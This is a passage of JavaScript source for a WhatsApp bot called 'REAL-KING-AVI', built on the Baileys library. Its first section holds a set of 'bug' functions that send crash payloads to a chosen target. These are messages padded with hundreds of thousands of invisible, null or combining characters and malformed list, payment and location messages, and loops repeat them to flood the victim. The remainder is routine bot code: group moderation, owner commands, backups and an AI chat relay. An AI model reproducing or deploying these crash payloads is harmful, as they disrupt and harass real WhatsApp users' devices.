							"caption": `🗡REAL-KING-AVI🗡 🗡REAL-KING-AVI🗡 🗡REAL-KING-AVI🗡` + "ꦾ".repeat(50000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), { userJid: target, quoted: kuwoted })
			await Avishka.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
		}

		async function Avikillpic(target, kuwoted) {
			var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				interactiveMessage: {
					header: {
						title: "🗡REAL-KING-AVI🗡",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: Avishka.waUploadToServer }))
					},
					body: {
						text: ""
					},
					footer: {
						text: "›          #🗡REAL-KING-AVI🗡"
					},
					nativeFlowMessage: {
						messageParamsJson: "".repeat(1000000)
					}
				}
			}), { userJid: target, quoted: kuwoted });
			await Avishka.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
		}

		async function aipong(target) {
			await Avishka.relayMessage(target, { "paymentInviteMessage": { serviceType: "FBPAY", expiryTimestamp: Date.now() + 1814400000 } }, { participant: { jid: target } })
		}

		async function listAvifck(target, kuwoted) {
			var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				'listMessage': {
					'title': "🗡REAL-KING-AVI🗡" + "".repeat(920000),
					'footerText': `🗡REAL-KING-AVI🗡 🗡REAL-KING-AVI🗡 🗡REAL-KING-AVI🗡`,
					'description': `🗡REAL-KING-AVI🗡 🗡REAL-KING-AVI🗡 🗡REAL-KING-AVI🗡`,
					'buttonText': null,
					'listType': 2,
					'productListInfo': {
						'productSections': [{
							'title': 'anjay',
							'products': [
								{ "productId": "4392524570816732" }
							]
						}],
						'productListHeaderImage': {
							'productId': '4392524570816732',
							'jpegThumbnail': null
						},
						'businessOwnerJid': '0@s.whatsapp.net'
					}
				},
				'footer': 'puki',
				'contextInfo': {
					'expiration': 604800,
					'ephemeralSettingTimestamp': "1679959486",
					'entryPointConversionSource': "global_search_new_chat",
					'entryPointConversionApp': "whatsapp",
					'entryPointConversionDelaySeconds': 9,
					'disappearingMode': {
						'initiator': "INITIATED_BY_ME"
					}
				},
				'selectListType': 2,
				'product_header_info': {
					'product_header_info_id': 292928282928,
					'product_header_is_rejected': false
				}
			}), { userJid: target, quoted: oneclickAvi });
			await Avishka.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
		}



function followNewsletter(channelId) {
  try {
    Avishka.newsletterFollow(channelId);
    console.log(`running ${channelId}`);
  } catch (error) {
    console.error('Newsletter follow error:', error);
  }
}

		async function sendRepeatedMessages(jid, count) {
			for (let i = 0; i < count; i++) {
				Avishka.sendMessage(recipientJid, {
					'text': ''.repeat(50000)
				}, {
					'participant': {
						'jid': jid
					},
					'messageId': etc.key.id
				}, {
					'quoted': m
				});
			}
		}

		async function sendViewOnceMessages(jid, count) {
			for (let i = 0; i < count; i++) {
				let messageContent = generateWAMessageFromContent(jid, {
					'viewOnceMessage': {
						'message': {
							'messageContextInfo': {
								'deviceListMetadata': {},
								'deviceListMetadataVersion': 3
							},
							'interactiveMessage': proto.Message.InteractiveMessage.create({
								'body': proto.Message.InteractiveMessage.Body.create({
									'text': ''
								}),
								'footer': proto.Message.InteractiveMessage.Footer.create({
									'text': ''
								}),
								'header': proto.Message.InteractiveMessage.Header.create({
									'title': '',
									'subtitle': '',
									'hasMediaAttachment': false
								}),
								'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
									'buttons': [{
										'name': "cta_url",
										'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
									}],
									'messageParamsJson': "\0".repeat(100000)
								})
							})
						}
					}
				}, {});
				Avishka.relayMessage(jid, messageContent.message, {
					'messageId': messageContent.key.id
				});
			}
		}

		async function sendSystemCrashMessage(jid) {
			var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								'title': '',
								'subtitle': " "
							},
							'body': {
								'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
							},
							'footer': {
								'text': 'xp'
							},
							'nativeFlowMessage': {
								'buttons': [{
									'name': 'cta_url',
									'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
								}],
								'messageParamsJson': "\0".repeat(1000000)
							}
						}
					}
				}
			}), {
				'userJid': jid
			});
			await Avishka.relayMessage(jid, messageContent.message, {
				'participant': {
					'jid': jid
				},
				'messageId': messageContent.key.id
			});
		}
		async function sendListMessage(jid) {
			var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
				'listMessage': {
					'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
					'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
					'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
					'buttonText': null,
					'listType': 2,
					'productListInfo': {
						'productSections': [{
							'title': "lol",
							'products': [{
								'productId': "4392524570816732"
							}]
						}],
						'productListHeaderImage': {
							'productId': "4392524570816732",
							'jpegThumbnail': null
						},
						'businessOwnerJid': "0@s.whatsapp.net"
					}
				},
				'footer': "lol",
				'contextInfo': {
					'expiration': 600000,
					'ephemeralSettingTimestamp': "1679959486",
					'entryPointConversionSource': "global_search_new_chat",
					'entryPointConversionApp': "whatsapp",
					'entryPointConversionDelaySeconds': 9,
					'disappearingMode': {
						'initiator': "INITIATED_BY_ME"
					}
				},
				'selectListType': 2,
				'product_header_info': {
					'product_header_info_id': 292928282928,
					'product_header_is_rejected': false
				}
			}), {
				'userJid': jid
			});

			await Avishka.relayMessage(jid, messageContent.message, {
				'participant': {
					'jid': jid
				},
				'messageId': messageContent.key.id
			});
		}

		async function sendLiveLocationMessage(jid) {
			var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'liveLocationMessage': {
							'degreesLatitude': 'p',
							'degreesLongitude': 'p',
							'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
							'sequenceNumber': '0',
							'jpegThumbnail': ''
						}
					}
				}
			}), {
				'userJid': jid
			});

			await Avishka.relayMessage(jid, messageContent.message, {
				'participant': {
					'jid': jid
				},
				'messageId': messageContent.key.id
			});
		}

		async function sendExtendedTextMessage(jid) {
			Avishka.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
		}
		async function sendPaymentInvite(jid) {
			Avishka.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
		}

		async function sendMultiplePaymentInvites(jid, count) {
			for (let i = 0; i < count; i++) {
				sendPaymentInvite(jid);
				sendExtendedTextMessage(jid);
				await sleep(500);
			}
		}

		async function sendVariousMessages(jid, count) {
			for (let i = 0; i < count; i++) {
				sendListMessage(jid);
				sendLiveLocationMessage(jid);
				sendSystemCrashMessage(jid);
				await sleep(500);
			}
		}

		async function sendRepeatedMessages2(jid, count) {
			for (let i = 0; i < count; i++) {
				sendSystemCrashMessage(jid);
				sendSystemCrashMessage(jid);
				sendSystemCrashMessage(jid);
				await sleep(500);
			}
		}

		async function sendMixedMessages(jid, count) {
			for (let i = 0; i < count; i++) {
				sendLiveLocationMessage(jid);
				sendListMessage(jid);
				await sleep(500);
			}
		}

		function sendMessageWithMentions(text, mentions = [], quoted = false) {
			if (quoted == null || quoted == undefined || quoted == false) {
				return Avishka.sendMessage(m.chat, {
					'text': text,
					'mentions': mentions
				}, {
					'quoted': m
				});
			} else {
				return Avishka.sendMessage(m.chat, {
					'text': text,
					'mentions': mentions
				}, {
					'quoted': m
				});
			}
		}

		const xbug2 = {
			key: {
				remoteJid: 'status@broadcast',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				listResponseMessage: {
					title: botname
				}
			}
		}
		
		
/*my new bug bounty*/ 



async function sendCustomExtendedText(Avishka, jid, text, quoteText, disappearing = false) {
  const payload = {
    extendedTextMessage: {
      text: text,
      contextInfo: {
        quotedMessage: {
          conversation: quoteText
        },
        disappearingMode: disappearing ? {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        } : undefined,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }
  };

  // Remove undefined fields
  if (!disappearing) delete payload.extendedTextMessage.contextInfo.disappearingMode;

  await Avishka.relayMessage(jid, payload, {
    participant: { jid: jid }
  });
}



		
		


		/*|⬡════════════════════════════════════════════|❝   𝙰vi - Bug function - END ™ ❞|═══════════════════════════════════════════⬡|*/
		//======end bug functions========\\  


		async function loading() {
			var aviload = [
				"🧊 [▢ ▢ ▢ ▢ ▢] 𝟶%",
                "🧊 [■ ▢ ▢ ▢ ▢] 𝟸𝟶%",
                "🧊 [■ ■ ▢ ▢ ▢] 𝟺𝟶%",
                "🧊 [■ ■ ■ ▢ ▢] 𝟼𝟶%",
                "🧊 [■ ■ ■ ■ ▢] 𝟾𝟶%",
                "🧊 [■ ■ ■ ■ ■] 𝟷𝟶𝟶%",
				"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ⚠..."
			]
			let { key } = await Avishka.sendMessage(m.chat, { text: 'ʟᴏᴀᴅɪɴɢ...' })

			for (let i = 0; i < aviload.length; i++) {
				await Avishka.sendMessage(m.chat, { text: aviload[i], edit: key });
			}
		}


		//-------------------------------------

		// Reset Limit
		cron.schedule('00 00 * * *', async () => {
			cmdDel(db.hit);
			console.log('Reseted Limit Users')
			let user = Object.keys(db.users)
			for (let jid of user) {
				const limitUser = db.users[jid].vip ? limit.vip : checkStatus(jid, premium) ? limit.premium : limit.free
				if (db.users[jid].limit < limitUser) db.users[jid].limit = limitUser
			}
			if (set?.autobackup) {
				let datanya = './database/' + tempatDB;
				if (tempatDB.startsWith('mongodb')) {
					datanya = './database/backup_database.json';
					fs.writeFileSync(datanya, JSON.stringify(global.db, null, 2), 'utf-8');
				}
				let tglnya = new Date().toISOString().replace(/[:.]/g, '-');
				for (let o of owner) {
					try {
						await Avishka.sendMessage(o, { document: fs.readFileSync(datanya), mimetype: 'application/json', fileName: tglnya + '_database.json' })
						console.log(`[AUTO BACKUP]  is Success  ${o}`);
					} catch (e) {
						console.error(`[AUTO BACKUP] is Fail ${o}:`, error);
					}
				}
			}
		}, {
			scheduled: true,
			timezone: 'Asia/Colombo'
		});

		// Auto Set Bio
		if (set.autobio) {
			if (new Date() * 1 - set.status > 60000) {
				await Avishka.updateProfileStatus(`𝙷𝙸 👋🏻 𝙸'𝙼 𝙰𝚅𝙸 🥷🏻 𝙷4𝙲𝙺3𝚁 𝚃𝙴𝙰𝙼 𝙼𝙴𝙼𝙱𝙴𝚁 🗡️ | 🪄 Runtime : ${runtime(process.uptime())}`).catch(e => { })
				set.status = new Date() * 1
			}
		}



		if (!isCreator) {
			if (!Avishka.public && !
				m.key.fromMe) return
		}



		// Group Settings
		if (m.isGroup) {
			// Mute
			if (db.groups[m.chat].mute && !isCreator) {
				return
			}

			// Anti Hidetag
			if (!m.key.fromMe && m.mentionedJid?.length === m.metadata.participanis?.length && db.groups[m.chat].antihidetag && !isCreator && m.isBotAdmin && !m.isAdmin) {
				await Avishka.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: m.sender } })
				await m.reply('*Anti Hidetag is Active❗*')
			}

/* if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmin || !isBotAdmin){		  
        } else {
          m.reply(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await
					await Avishka.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 */



			// Anti Tag Sw
			if (!m.key.fromMe && db.groups[m.chat].antitagsw && !isCreator && m.isBotAdmin && !m.isAdmin) {
				if (m.type === 'groupStatusMentionMessage' || m.message?.groupStatusMentionMessage || m.message?.protocolMessage?.type === 25 || Object.keys(m.message).length === 1 && Object.keys(m.message)[0] === 'messageContextInfo') {
					if (!db.groups[m.chat].tagsw[m.sender]) {
						db.groups[m.chat].tagsw[m.sender] = 1
						await m.reply(`This group was detected being tagged in whatsapp status\n@${m.sender.split('@')[0]}, please do not mark group in whatsApp status\nWarning ${db.groups[m.chat].tagsw[m.sender]}/5, will be kicked at any time❗`)
					} else if (db.groups[m.chat].tagsw[m.sender] >= 5) {
						await Avishka.groupParticipantsUpdate(m.chat, [m.sender], 'remove').catch((err) => m.reply('Gagal!'))
						await m.reply(`@${m.sender.split("@")[0]} has been removed from the group\nbecause it tagged the group in WhatsApp status 5 times`)
						delete db.groups[m.chat].tagsw[m.sender]
					} else {
						db.groups[m.chat].tagsw[m.sender] += 1
						await m.reply(`This group was detected as being tagged in Whatsapp Status\n@${m.sender.split('@')[0]},please do not tag groups in Whatsapp Status\nWarning ${db.groups[m.chat].tagsw[m.sender]}/5, will be kicked at any time❗`)
					}
				}
			}

			// Anti Toxic
			if (!m.key.fromMe && db.groups[m.chat].antitoxic && !isCreator && m.isBotAdmin && !m.isAdmin) {
				if (budy.toLowerCase().split(/\s+/).some(word => badWords.includes(word))) {
					await Avishka.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: m.sender } })
					await Avishka.relayMessage(m.chat, { extendedTextMessage: { text: `Detected @${m.sender.split('@')[0]} Said Toxic\nPlease use polite language.`, contextInfo: { mentionedJid: [m.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Toxic❗*' }, ...m.key } } }, {})
				}
			}

			// Anti Delete
			if (m.type == 'protocolMessage' && db.groups[m.chat].antidelete && !isCreator && m.isBotAdmin && !m.isAdmin) {
				const mess = msg.message.protocolMessage
				if (store?.messages?.[m.chat]?.array) {
					const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
					if (!chats?.msg) return
					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Delete❗*' }, ...chats.key }
					const pesan = chats.type === 'conversation' ? { extendedTextMessage: { text: chats.msg, contextInfo: { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Delete❗*' }, ...chats.key } } } : { [chats.type]: chats.msg }
					await Avishka.relayMessage(m.chat, pesan, {})
				}
			}

			// Anti Link Group
			if (db.groups[m.chat].antilink && !isCreator && m.isBotAdmin && !m.isAdmin) {
				if (budy.match('chat.whatsapp.com/')) {
					await Avishka.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: m.sender } })
					await Avishka.relayMessage(m.chat, { extendedTextMessage: { text: `Detected @${m.sender.split('@')[0]} Sending Group Link\nSorry, link Must Be removed..`, contextInfo: { mentionedJid: [m.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Link❗*' }, ...m.key } } }, {})
				}
			}

			// Anti Virtex Group
			if (db.groups[m.chat].antivirtex && !isCreator && m.isBotAdmin && !m.isAdmin) {
				if (budy.length > 4000) {
					await Avishka.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: m.sender } })
					await Avishka.relayMessage(m.chat, { extendedTextMessage: { text: `Detected @${m.sender.split('@')[0]} sending Virtex..`, contextInfo: { mentionedJid: [m.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Virtex❗*' }, ...m.key } } }, {})
					await Avishka.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
				}
				if (m.msg?.nativeFlowMessage?.messageParamsJson?.length > 3500) {
					await Avishka.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: m.sender } })
					await Avishka.relayMessage(m.chat, { extendedTextMessage: { text: `Detected @${m.sender.split('@')[0]} sending Bug..`, contextInfo: { mentionedJid: [m.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Bug❗*' }, ...m.key } } }, {})
					await Avishka.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
				}
			}

		}

		// Auto Read
		if (m.message && m.key.remoteJid !== 'status@broadcast') {
			if ((set.autoread && Avishka.public) || isCreator) {
				Avishka.readMessages([m.key]);
				console.log(chalk.black(chalk.bgWhite('[ PESAN ]:'), chalk.bgGreen(new Date), chalk.bgHex('#00EAD3')(budy || m.type), chalk.bgHex('#AF26EB')(m.key.id) + '\n' + chalk.bgCyanBright('[ DARI ] :'), chalk.bgYellow(m.pushName || (isCreator ? 'Bot' : 'Anonim')), chalk.bgHex('#FF449F')(m.sender), chalk.bgHex('#FF5700')(m.isGroup ? m.metadata.subject : m.chat.endsWith('@newsletter') ? 'Newsletter' : 'Private Chat'), chalk.bgBlue('(' + m.chat + ')')));
			}
		} 

		// Filter Bot & Ban
		if (m.isBot) return
		if (db.users[m.sender]?.ban && !isCreator) return

		// Mengetik & Anti Spam & Hit
		if (Avishka.public && isCmd) {
			if (set.autotyping) {
				await Avishka.sendPresenceUpdate('composing', m.chat)
			}
			if (cases.includes(command)) {
				cmdAdd(db.hit);
				cmdAddHit(db.hit, command);
			}
			if (set.antispam && antiSpam.isFiltered(m.sender)) {
				console.log(chalk.bgRed('[ SPAM ] : '), chalk.black(chalk.bgHex('#1CFFF7')(`From -> ${m.sender}`), chalk.bgHex('#E015FF')(` In ${m.isGroup ? m.chat : 'Private Chat'}`)))
				return m.reply('「 ❗ 」5 - seccond pause per command, bro')
			}
		}

		if (isCmd && !isCreator) antiSpam.addFilter(m.sender)

		// Salam
		if (/^a(s|ss)alamu('|)alaikum(| )(wr|)( |)(wb|)$/.test(budy?.toLowerCase())) {
			const jwb_salam = ['a', 'a\'a', 'a\'a']
			m.reply(pickRandom(jwb_salam))
		}


		// Cek Expired
		checkExpired(premium);
		checkExpired(sewa, Avishka);



	// Menfes & Room Ai
		if (!m.isGroup && (!isCmd || isCreator)) {
			if (menfes[m.sender] && m.key.remoteJid !== 'status@broadcast' && m.msg) {
				m.react('✈');
				m.msg.contextInfo = { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Pesan Dari ${menfes[m.sender].nama ? menfes[m.sender].nama : 'Seseorang'}*` }, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' } }
				const pesan = m.type === 'conversation' ? { extendedTextMessage: { text: m.msg, contextInfo: { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Pesan Dari ${menfes[m.sender].nama ? menfes[m.sender].nama : 'Seseorang'}*` }, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' } } } } : { [m.type]: m.msg }
				await Avishka.relayMessage(menfes[m.sender].tujuan, pesan, {});
			}

			if (chat_ai[m.sender] && m.key.remoteJid !== 'status@broadcast') {
				if (!/^(del((room|c|hat)ai)|>|<$)$/i.test(command) && budy) {
					chat_ai[m.sender].push({ role: 'user', content: budy });
					let hasil;
					try {
						hasil = await gptLogic(chat_ai[m.sender], budy)
					} catch (e) {
						try {
							hasil = await yanzGpt(chat_ai[m.sender])
						} catch (e) {
							hasil = 'Gagal Mengambil Respon, Website sedang gangguan'
						}
					}
					const response = hasil?.choices?.[0]?.message?.content || hasil || 'Maaf, saya tidak mengerti.';
					chat_ai[m.sender].push({ role: 'assistant', content: response });
					await m.reply(response)
				}
			}
		}

//main switch statement 
		switch (command) {
			/*|⬡════════════════════════════════════════════|❝   𝙰vi -  Add Case..  ™ ❞|═══════════════════════════════════════════⬡|*/

			case '20': {
				console.log('.')
			}
				break
			case '30': {
				console.log(args[0])
				Avishka.appendResponseMessage(m, args[0])
			}
				break
			/*|⬡════════════════════════════════════════════|❝   𝙰vi -   Owner Menu..  ™ ❞|═══════════════════════════════════════════⬡|*/

			case 'shutdown': case 'off': {
	//			if (!isCreator) return m.reply(mess.owner)
				m.reply(`*[BOT] Process Shutdown...*`).then(() => {
					process.exit(0)
				})
			}
				break
			case 'setbio': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply('Mana text nya?')
				Avishka.setStatus(q)
				m.reply(`*Bio telah di ganti menjadi ${q}*`)
			}
				break
				
			
			case 'delppbot': {
				if (!isCreator) return m.reply(mess.owner)
				await Avishka.removeProfilePicture(Avishka.user.id)
				m.reply('Success')
			}
				break
			case 'join': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply('Masukkan Link Group!')
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!')
				const result = args[0].split('https://chat.whatsapp.com/')[1]
				m.reply(mess.wait)
				await Avishka.groupAcceptInvite(result).catch((res) => {
					if (res.data == 400) return m.reply('Grup Tidak Di Temukan❗');
					if (res.data == 401) return m.reply('Bot Di Kick Dari Grup Tersebut❗');
					if (res.data == 409) return m.reply('Bot Sudah Join Di Grup Tersebut❗');
					if (res.data == 410) return m.reply('Url Grup Telah Di Setel Ulang❗');
					if (res.data == 500) return m.reply('Grup Penuh❗');
				})
			}
				break
			case 'leave': {
				if (!isCreator) return m.reply(mess.owner)
				await Avishka.groupLeave(m.chat).then(() => Avishka.sendFromOwner(owner, 'Success Keluar Dari Grup', m, { contextInfo: { isForwarded: true } })).catch(e => { });
			}
				break
			case 'clearchat': {
				//if (!isCreator) return m.reply(mess.owner)
				await Avishka.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }] }, m.chat).catch((e) => m.reply('Gagal Menghapus Chat!'))
				m.reply('Success Membersihkan Pesan')
			}
				break
			case 'getmsgstore': case 'storemsg': {
				if (!isCreator) return m.reply(mess.owner)
				let [teks1, teks2] = text.split`|`
				if (teks1 && teks2) {
					const msgnya = await store.loadMessage(teks1, teks2)
					if (msgnya?.message) await Avishka.relayMessage(m.chat, msgnya.message, {})
					else m.reply('Pesan Tidak Ditemukan!')
				} else m.reply(`Contoh: ${prefix + command} 123xxx@g.us|3EB0xxx`)
			}
				break
			case 'blokir': case 'block': {
				if (!isCreator) return m.reply(mess.owner)
				if (text || m.quoted) {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await Avishka.updateBlockStatus(numbersOnly, 'block').then((a) => m.reply(mess.done)).catch((err) => m.reply('Gagal!'))
				} else m.reply(`Contoh: ${prefix + command} 94xxx`)
			}
				break
			case 'listblock': {
				let anu = await Avishka.fetchBlocklist()
				m.reply(`Total Block : ${anu.length}\n` + anu.map(v => '🚫 ' + v.replace(/@.+/, '')).join`\n`)
			}
				break
			case 'openblokir': case 'unblokir': case 'openblock': case 'unblock': {
				if (!isCreator) return m.reply(mess.owner)
				if (text || m.quoted) {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await Avishka.updateBlockStatus(numbersOnly, 'unblock').then((a) => m.reply(mess.done)).catch((err) => m.reply('Gagal!'))
				} else m.reply(`Contoh: ${prefix + command} 94xxx`)
			}
				break
			case 'ban': case 'banned': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply(`Kirim/tag Nomernya!\nExample:\n${prefix + command} 94xxx`)
				const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (db.users[nmrnya] && !db.users[nmrnya].ban) {
					db.users[nmrnya].ban = true
					m.reply('User Telah Di ban!')
				} else m.reply('User tidak terdaftar di database!')
			}
				break
			case 'unban': case 'unbanned': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply(`Kirim/tag Nomernya!\nExample:\n${prefix + command} 94xxx`)
				const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (db.users[nmrnya] && db.users[nmrnya].ban) {
					db.users[nmrnya].ban = false
					m.reply('User Telah Di unban!')
				} else m.reply('User tidak terdaftar di database!')
			}
				break
			case 'mute': case 'unmute': {
				if (!isCreator) return m.reply(mess.owner)
				if (!m.isGroup) return m.reply(mess.group)
				if (command == 'mute') {
					db.groups[m.chat].mute = true
					m.reply('Bot Telah Di Mute Di Grup Ini!')
				} else if (command == 'unmute') {
					db.groups[m.chat].mute = false
					m.reply('Success Unmute')
				}
			}
				break
			case 'adduang': case 'addmoney': {
				if (!isCreator) return m.reply(mess.owner)
				if (!args[0] || !args[1] || isNaN(args[1])) return m.reply(`Kirim/tag Nomernya!\nExample:\n${prefix + command} 94xxx 1000`)
				if (args[1].length > 15) return m.reply('Jum.chatah Money Maksimal 15 digit angka!')
				const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				const onWa = await Avishka.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
				if (db.users[nmrnya] && db.users[nmrnya].money >= 0) {
					addMoney(args[1], nmrnya, db)
					m.reply('Success Add Uang')
				} else m.reply('User tidak terdaftar di database!')
			}
				break
			case 'addlimit': {
				if (!isCreator) return m.reply(mess.owner)
				if (!args[0] || !args[1] || isNaN(args[1])) return m.reply(`Kirim/tag Nomernya!\nExample:\n${prefix + command} 94xxx 10`)
				if (args[1].length > 10) return m.reply('Jum.chatah Limit Maksimal 10 digit angka!')
				const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				const onWa = await Avishka.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
				if (db.users[nmrnya] && db.users[nmrnya].limit >= 0) {
					addLimit(args[1], nmrnya, db)
					m.reply('Success Add limit')
				} else m.reply('User tidak terdaftar di database!')
			}
				break
			case 'listpc': {
	//			if (!isCreator) return m.reply(mess.owner)
				let anu = Object.keys(store.messages).filter(a => a.endsWith('.net') || a.endsWith('lid'));
				let teks = `● *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
				if (anu.length === 0) return m.reply(teks)
				for (let i of anu) {
					if (store.messages?.[i]?.array?.length) {
						let nama = Avishka.getName(m.sender)
						teks += `${setv} *Nama :* ${nama}\n${setv} *User :* @${i.split('@')[0]}\n${setv} *Chat :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`
					}
				}
				await m.reply(teks)
			}
				break
			case 'listgc': {
				if (!isCreator) return m.reply(mess.owner)
				let anu = Object.keys(store.messages).filter(a => a.endsWith('@g.us'));
				let teks = `● *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
				if (anu.length === 0) return m.reply(teks)
				for (let i of anu) {
					let metadata;
					try {
						metadata = store.groupMetadata[i]
					} catch (e) {
						metadata = (store.groupMetadata[i] = await Avishka.groupMetadata(i).catch(e => ({})))
					}
					teks += metadata?.subject ? `${setv} *Nama :* ${metadata.subject}\n${setv} *Admin :* ${metadata.owner ? `@${metadata.owner.split('@')[0]}` : '-'}\n${setv} *ID :* ${metadata.id}\n${setv} *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n${setv} *Member :* ${metadata.participants.length}\n\n=====================\n\n` : ''
				}
				await m.reply(teks)
			}
				break
			case 'creategc': case 'buatgc': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply(`Example:\n${prefix + command} *Nama Gc*`)
				let group = await Avishka.groupCreate(q, [m.sender])
				let res = await Avishka.groupInviteCode(group.id)
				await m.reply(`*Link Group :* *https://chat.whatsapp.com/${res}*\n\n*Nama Group :* *${group.subject}*\nSegera Masuk dalam 30 detik\nAgar menjadi Admin`, { detectLink: true })
				await sleep(30000)
				await Avishka.groupParticipantsUpdate(group.id, [m.sender], 'promote').catch(e => { });
				await Avishka.sendMessage(group.id, { text: 'Done' })
			}
				break
			case 'addsewa': case 'sewa': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply(`Example:\n${prefix + command} https://chat.whatsapp.com/xxx | waktu\n${prefix + command} https://chat.whatsapp.com/xxx | 30 hari`)
				let [teks1, teks2] = text.split('|').map(x => x.trim());
				if (!isUrl(teks1) && !teks1.includes('chat.whatsapp.com/')) return m.reply('Link Invalid!')
				const urlny = teks1.split('chat.whatsapp.com/')[1]
				try {
					await Avishka.groupAcceptInvite(urlny)
				} catch (e) {
					if (e.data == 400) return m.reply('Grup Tidak Di Temukan❗');
					if (e.data == 401) return m.reply('Bot Di Kick Dari Grup Tersebut❗');
					if (e.data == 410) return m.reply('Url Grup Telah Di Setel Ulang❗');
					if (e.data == 500) return m.reply('Grup Penuh❗');
				}
				await Avishka.groupGetInviteInfo(urlny).then(a => {
					addExpired({ url: urlny, expired: (teks2?.replace(/[^0-9]/g, '') || 30) + 'd', ...a }, sewa)
